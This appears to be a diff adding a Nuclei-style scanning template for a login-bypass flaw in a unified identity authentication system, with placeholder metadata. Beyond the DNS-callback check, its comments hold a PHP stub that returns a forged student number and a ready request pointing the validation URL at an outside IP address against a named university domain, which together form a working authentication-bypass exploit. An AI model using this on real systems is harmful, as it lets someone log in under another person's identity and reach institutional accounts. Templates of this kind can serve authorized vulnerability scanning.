@@ -1,0 +1,24 @@
+id: drcas-login-bypass
+info:
+  name: Template Name
+  author: wangzong
+  severity: high
+  description: 统一身份认证系统登录逻辑漏洞
+  reference:
+    - https://
+  tags: tags
+http:
+  - method: GET
+    path:
+      - "{{BaseURL}}/tpass/1?vpn_from=vpn&vpn_validate_url={{interactsh-url}}&service={{BaseURL}}"
+    matchers:
+      - type: word
+        part: interactsh_protocol # Confirms the DNS Interaction
+        words:
+          - "dns"
+#<?php 
+
+#echo "{\"student_number\":\"09901\"}";
+
+#?>r
+#tpass/1?vpn_from=vpn&vpn_validate_url=http://116.204.91.234/1.php&service=http://one.hrbnu.edu.cn/
